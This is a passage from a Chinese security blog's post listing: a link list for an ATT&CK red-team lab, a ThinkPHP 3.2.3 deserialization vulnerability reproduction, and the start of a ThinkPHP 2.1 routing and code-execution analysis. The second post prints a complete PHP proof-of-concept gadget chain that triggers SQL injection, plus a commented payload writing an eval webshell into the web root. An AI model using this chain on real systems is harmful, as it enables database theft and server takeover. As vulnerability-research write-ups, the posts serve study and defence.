</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/05/08/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/">ATT&amp;CK红队评估实战靶场（一）</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-05-08</time><div class="content"><p>由于键盘的缘故，写了好几天的博客没有了<br>这里提供我的参考博客</p>
<p><a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/">环境搭建</a></p>
<p><a target="_blank" rel="noopener" href="https://www.yongsheng.site/2021/03/22/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/">大佬博客</a><br><a target="_blank" rel="noopener" href="https://jishuin.proginn.com/p/763bfbd2e94e">添加路由</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/zzlx123/article/details/103661662">木马生成及利用</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1853985">进程迁移</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53087192/article/details/112707016">kiwi的简单使用</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/05/07/Thinkphp3.2.3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Thinkphp3.2.3反序列化漏洞复现</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-05-07</time><div class="content"><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先全局搜索 destruct， 这里的 $this-&gt;img 可控，可以利用其来调用 其他类的destroy() 方法，或者可以用的call() 方法，__call() 方法并没有可以利用的<br><img src="https://img-blog.csdnimg.cn/a48d15617c7b4ef68298ba4426f9de87.png"><br>那就去找 destroy() 方法<br><img src="https://img-blog.csdnimg.cn/9ca44d705f4646c4ad67e984cfa33b34.png"><br>注意这里，destroy() 是有参数的，而我们调用的时候没有传参，这在php5中是可以的，只发出警告，但还是会执行。</p>
<p>但是在php7 里面就会报出错误，不会执行。</p>
<p>所以漏洞需要用php5的环境。<br>继续寻找可利用的delete()方法。</p>
<p>在Think\Model类即其继承类里，可以找到这个方法，还有数据库驱动类中也有这个方法的，thinkphp3的数据库模型类的最终是会调用到数据库驱动类中的。</p>
<p>先看Model类中。<br><img src="https://img-blog.csdnimg.cn/99915fec3498488abfad11ece63b0a16.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>注意，如果$options[‘where’]为空，会return掉<br><img src="https://img-blog.csdnimg.cn/9aed181c0ff54634bb8f9a3b5cafe717.png"><br>跟进 getPK() 方法<br><img src="https://img-blog.csdnimg.cn/f4020abc8f0c41c98a4ad38d39ea547b.png"><br>$pk可控 $this-&gt;data可控<br>最终去驱动类的入口在这里<br><img src="https://img-blog.csdnimg.cn/3e8a953802dd4c648d5d3d799affecc9.png" alt="在这里插入图片描述"><br>下面是驱动类的delete方法<br><img src="https://img-blog.csdnimg.cn/ad424b8009c949ab8351ee512655718f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>一开始调用Model类的delete方法的时候，传入的参数是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;sessionName.<span class="variable">$sessID</span></span><br></pre></td></tr></table></figure>
<p>而后面我们执行的时候是依靠数组的，数组是不可以用 字符串连接符的。参数控制不可以利用$this-&gt;sessionName。</p>
<p>但是可以令其为空（本来就是空），会进入Model 类中的delete方法中的第一个if分支，然后再次调用delete方法，把$this-&gt; $data[this−&gt;data[pk] 作为参数传入，这是我们可以控制的！</p>
<p>跟进driver类中的execute() 方法<br><img src="https://img-blog.csdnimg.cn/7a6dd7afd1be44c68f1e9027ac48494c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>跟进 initConnect() 方法<br><img src="https://img-blog.csdnimg.cn/5e9650a0dedb4b649ec1b2f66f423ae6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>跟进connect<br><img src="https://img-blog.csdnimg.cn/23244ce33cbc484f817777486c15de78.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>数据库的连接时通过 PDO 来实现的，可以堆叠注入(PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; true ) 需要指定这个配置。</p>
<p>这里控制 $this-&gt;config 来连接数据库。</p>
<p>driver类时抽象类，我们需要用mysql类来实例化。</p>
<p>到这里一条反序列化触发sql注入的链子就做好了。</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcache</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;sessionName=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle= <span class="keyword">new</span> Model();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>]=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;pk=<span class="string">&#x27;jiang&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk]=<span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;table&quot;</span>=&gt;<span class="string">&quot;mysql.user where 1=updatexml(1,concat(0x7e,user()),1)#&quot;</span>,</span><br><span class="line">            <span class="comment">//&quot;table&quot; =&gt; &quot;mysql.user where 1=1;select &#x27;<span class="meta">&lt;?php</span> eval(\$_POST[1]);<span class="meta">?&gt;</span>&#x27; into outfile &#x27;/var/www/html/shell.php&#x27;;#&quot;,//堆叠打开才能用</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;where&quot;</span>=&gt;<span class="string">&quot;1=1&quot;</span></span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;db=<span class="keyword">new</span> Mysql();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">PDO</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> ;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;options= <span class="keyword">array</span>(</span><br><span class="line">        PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>, <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        <span class="comment">//PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; true,//堆叠打开</span></span><br><span class="line">        );   </span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;config= <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;mysql&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span></span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Imagick()));</span><br><span class="line"></span><br></pre></td></tr></table></figure>








</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/05/07/Thinkphp2.1%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%8F%8A%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90/">Thinkphp2.1代码执行及路由分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-05-07</time><div class="content"><p>Dispatcher.class.php这个文件中是url路由，由于第一次正式看路由那块，所以就从头开始一行一行看把。<br>首先是dispatch函数<br>是37行到140行<br>这个函数是做映射用，把url映射到控制器对我们来说算是最重要的一块</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$urlMode</span>  =  C(<span class="string">&#x27;URL_MODEL&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$urlMode</span> == URL_REWRITE ) &#123;</span><br><span class="line">    <span class="comment">//当前项目地址</span></span><br><span class="line">    <span class="variable">$url</span>    =   dirname(_PHP_FILE_);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$url</span> == <span class="string">&#x27;/&#x27;</span> || <span class="variable">$url</span> == <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">        <span class="variable">$url</span>    =   <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    define(<span class="string">&#x27;PHP_FILE&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$urlMode</span> == URL_COMPAT)&#123;</span><br><span class="line">    define(<span class="string">&#x27;PHP_FILE&#x27;</span>,_PHP_FILE_.<span class="string">&#x27;?&#x27;</span>.C(<span class="string">&#x27;VAR_PATHINFO&#x27;</span>).<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//当前项目地址</span></span><br><span class="line">    define(<span class="string">&#x27;PHP_FILE&#x27;</span>,_PHP_FILE_);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>一开始就调用了一个名叫C的函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params"><span class="variable">$name</span>=<span class="literal">null</span>, <span class="variable">$value</span>=<span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$_config</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">// 无参数时获取所有</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$name</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_config</span>;</span><br><span class="line">    <span class="comment">// 优先执行设置获取或赋值</span></span><br><span class="line">    <span class="keyword">if</span> (is_string(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!strpos(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$name</span> = strtolower(<span class="variable">$name</span>);</span><br><span class="line">            <span class="keyword">if</span> (is_null(<span class="variable">$value</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_config</span>[<span class="variable">$name</span>]) ? <span class="variable">$_config</span>[<span class="variable">$name</span>] : <span class="literal">null</span>;</span><br><span class="line">            <span class="variable">$_config</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 二维数组设置和获取支持</span></span><br><span class="line">        <span class="variable">$name</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$name</span>[<span class="number">0</span>] = strtolower(<span class="variable">$name</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$value</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_config</span>[<span class="variable">$name</span>[<span class="number">0</span>]][<span class="variable">$name</span>[<span class="number">1</span>]]) ? <span class="variable">$_config</span>[<span class="variable">$name</span>[<span class="number">0</span>]][<span class="variable">$name</span>[<span class="number">1</span>]] : <span class="literal">null</span>;</span><br><span class="line">        <span class="variable">$_config</span>[<span class="variable">$name</span>[<span class="number">0</span>]][<span class="variable">$name</span>[<span class="number">1</span>]] = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 批量设置</span></span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$name</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_config</span> = array_merge(<span class="variable">$_config</span>, array_change_key_case(<span class="variable">$name</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 避免非法参数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看出这是一个对传入参数进行获取处理以及过滤的函数<br>而URL_MODEL是一个常量表示url的四种模式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="string">&#x27;URL_MODEL&#x27;</span>      =&gt; <span class="number">1</span>,       <span class="comment">// URL访问模式,可选参数0、1、2、3,代表以下四种模式：</span></span><br><span class="line"><span class="comment">// 0 (普通模式); 1 (PATHINFO 模式); 2 (REWRITE  模式); 3 (兼容模式)  默认为PATHINFO 模式，提供最好的用户体验和SEO支持</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.cxyzjd.com/article/u012382791/50845351">四种模式</a><br>根据模式的不同url格式也有不同。这里到没有什么太多可说的。接下来是一长串对二级域名进行处理的，也先跳过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span>(!<span class="built_in">self</span>::routerCheck())&#123;   <span class="comment">// 检测路由规则 如果没有则按默认规则调度URL</span></span><br><span class="line">        <span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>],<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">        <span class="variable">$var</span>  =  <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)]))&#123;</span><br><span class="line">            <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)] = in_array(strtolower(<span class="variable">$paths</span>[<span class="number">0</span>]),explode(<span class="string">&#x27;,&#x27;</span>,strtolower(C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>))))? array_shift(<span class="variable">$paths</span>) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(C(<span class="string">&#x27;APP_GROUP_DENY&#x27;</span>) &amp;&amp; in_array(strtolower(<span class="variable">$var</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)]),explode(<span class="string">&#x27;,&#x27;</span>,strtolower(C(<span class="string">&#x27;APP_GROUP_DENY&#x27;</span>))))) &#123;</span><br><span class="line">                <span class="comment">// 禁止直接访问分组</span></span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[C(<span class="string">&#x27;VAR_MODULE&#x27;</span>)])) &#123;<span class="comment">// 还没有定义模块名称</span></span><br><span class="line">            <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_MODULE&#x27;</span>)]  =   array_shift(<span class="variable">$paths</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_ACTION&#x27;</span>)]  =   array_shift(<span class="variable">$paths</span>);</span><br><span class="line">        <span class="comment">// 解析剩余的URL参数</span></span><br><span class="line">        <span class="variable">$res</span> = preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br><span class="line">        <span class="variable">$_GET</span>   =  array_merge(<span class="variable">$var</span>,<span class="variable">$_GET</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取分组 模块和操作名称</span></span><br><span class="line">    <span class="keyword">if</span> (C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        define(<span class="string">&#x27;GROUP_NAME&#x27;</span>, <span class="built_in">self</span>::getGroup(C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)));</span><br><span class="line">        <span class="comment">// 加载分组配置文件</span></span><br><span class="line">        <span class="keyword">if</span>(is_file(CONFIG_PATH.GROUP_NAME.<span class="string">&#x27;/config.php&#x27;</span>))</span><br><span class="line">            C(<span class="keyword">include</span> CONFIG_PATH.GROUP_NAME.<span class="string">&#x27;/config.php&#x27;</span>);</span><br><span class="line">        <span class="comment">// 加载分组函数文件</span></span><br><span class="line">        <span class="keyword">if</span>(is_file(COMMON_PATH.GROUP_NAME.<span class="string">&#x27;/function.php&#x27;</span>))</span><br><span class="line">            <span class="keyword">include</span> COMMON_PATH.GROUP_NAME.<span class="string">&#x27;/function.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    define(<span class="string">&#x27;MODULE_NAME&#x27;</span>,<span class="built_in">self</span>::getModule(C(<span class="string">&#x27;VAR_MODULE&#x27;</span>)));</span><br><span class="line">    define(<span class="string">&#x27;ACTION_NAME&#x27;</span>,<span class="built_in">self</span>::getAction(C(<span class="string">&#x27;VAR_ACTION&#x27;</span>)));</span><br><span class="line">    <span class="comment">// URL常量</span></span><br><span class="line">    <span class="comment">// 当前页面地址</span></span><br><span class="line">    <span class="comment">//define(&#x27;__SELF__&#x27;,$_SERVER[&#x27;PHP_SELF&#x27;]);</span></span><br><span class="line">    define(<span class="string">&#x27;__SELF__&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    define(<span class="string">&#x27;__INFO__&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>]);</span><br><span class="line">    <span class="comment">// 当前项目地址</span></span><br><span class="line">    define(<span class="string">&#x27;__APP__&#x27;</span>,PHP_FILE);</span><br><span class="line">    <span class="comment">// 当前模块和分组地址</span></span><br><span class="line">    <span class="variable">$module</span> = defined(<span class="string">&#x27;P_MODULE_NAME&#x27;</span>)?P_MODULE_NAME:MODULE_NAME;</span><br><span class="line">    <span class="keyword">if</span>(defined(<span class="string">&#x27;GROUP_NAME&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$group</span>   = C(<span class="string">&#x27;URL_CASE_INSENSITIVE&#x27;</span>) ?strtolower(GROUP_NAME):GROUP_NAME;</span><br><span class="line">        define(<span class="string">&#x27;__GROUP__&#x27;</span>,(!<span class="keyword">empty</span>(<span class="variable">$domainGroup</span>) || GROUP_NAME == C(<span class="string">&#x27;DEFAULT_GROUP&#x27;</span>) )?__APP__ : __APP__.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$group</span>);</span><br><span class="line">        define(<span class="string">&#x27;__URL__&#x27;</span>,!<span class="keyword">empty</span>(<span class="variable">$domainModule</span>)?__GROUP__.<span class="variable">$depr</span> : __GROUP__.<span class="variable">$depr</span>.<span class="variable">$module</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        define(<span class="string">&#x27;__URL__&#x27;</span>,!<span class="keyword">empty</span>(<span class="variable">$domainModule</span>)?__APP__.<span class="string">&#x27;/&#x27;</span> : __APP__.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$module</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 当前操作地址</span></span><br><span class="line">    define(<span class="string">&#x27;__ACTION__&#x27;</span>,__URL__.<span class="variable">$depr</span>.ACTION_NAME);</span><br><span class="line">    <span class="comment">//保证$_REQUEST正常取值</span></span><br><span class="line">    <span class="variable">$_REQUEST</span> = array_merge(<span class="variable">$_POST</span>,<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>路由控制这块重点应该是这串代码，所以重点看下</p>
